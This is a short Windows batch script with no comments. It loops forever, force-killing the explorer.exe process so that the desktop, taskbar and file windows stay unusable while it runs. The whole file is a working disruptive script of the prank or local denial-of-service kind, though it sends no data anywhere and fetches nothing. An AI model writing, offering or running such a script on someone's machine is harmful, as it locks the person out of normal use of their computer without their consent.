@echo off
:loop
taskkill /f /im explorer.exe
goto loop
